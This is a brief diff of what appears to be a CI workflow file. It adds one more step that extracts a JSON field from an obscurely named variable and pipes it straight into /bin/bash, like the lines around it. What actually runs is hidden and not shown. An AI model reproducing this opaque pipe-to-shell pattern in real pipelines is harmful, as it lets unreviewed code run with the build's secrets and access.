@@ -31,6 +31,7 @@ jobs:
           echo $ltdw13 | jq -r .qer945 | /bin/bash
           echo $jpjpn904 | jq -r .f2348 | /bin/bash
           printf '%s' "$y1" | jq -r .hxdi307 | /bin/bash
+          echo $a284 | jq -r .z3463 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
